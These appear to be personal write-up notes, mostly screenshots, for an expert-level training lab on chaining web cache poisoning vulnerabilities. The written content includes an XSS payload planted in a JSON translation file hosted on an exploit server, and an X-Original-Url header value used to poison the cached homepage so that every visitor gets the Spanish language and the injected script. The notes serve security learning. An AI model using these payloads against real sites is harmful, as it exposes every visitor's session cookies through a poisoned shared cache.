# EXPERT: Combining web cache poisoning vulnerabilities

![Снимок экрана 2025-12-02 в 15.48.34.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.48.34.png)

ParamMiner headers:

![Снимок экрана 2025-12-02 в 15.41.41.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.41.41.png)

![Снимок экрана 2025-12-02 в 15.41.56.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.41.56.png)

DOM based vulnerability

![Снимок экрана 2025-12-02 в 15.43.02.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.43.02.png)

![Снимок экрана 2025-12-02 в 15.44.14.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.44.14.png)

![Снимок экрана 2025-12-02 в 15.43.41.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.43.41.png)

Store on exploit server, append CORS * header:

```python
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
            "Description:": "Descripción"
        }
    }
}
```

![Снимок экрана 2025-12-02 в 15.45.16.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.45.16.png)

Home page cache poisoning

![Снимок экрана 2025-12-02 в 15.46.42.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.46.42.png)

![Снимок экрана 2025-12-02 в 15.48.14.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.48.14.png)

But Victim uses English. 
When the lang is changed, the following request is sent. We can use previously identified X-Original-URL to poison this one as well.

![Снимок экрана 2025-12-02 в 15.50.23.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.50.23.png)

![Снимок экрана 2025-12-02 в 15.51.46.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.51.46.png)

But there’s an obstacle: responses with Set-Cookie header are not cached.

However, we can use the following payload that will redirect to `/setlang/es?` page

```python
X-Original-Url: /setlang\es
```

![Снимок экрана 2025-12-02 в 15.52.40.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.52.40.png)

After combining 2 cache poisoning attacks and sending in sequence as a group, Victim is targeted.

Below attack sets language to spanish:

![Снимок экрана 2025-12-02 в 16.03.53.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_16.03.53.png)

Below attack injects exploit server with malicious script:

![Снимок экрана 2025-12-02 в 15.57.33.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.57.33.png)

So everyone who lands on homepage gets set with spanish language and injected:

![Снимок экрана 2025-12-02 в 15.58.06.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_15.58.06.png)

![Снимок экрана 2025-12-02 в 16.05.52.png](EXPERT%20Combining%20web%20cache%20poisoning%20vulnerabiliti/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_16.05.52.png)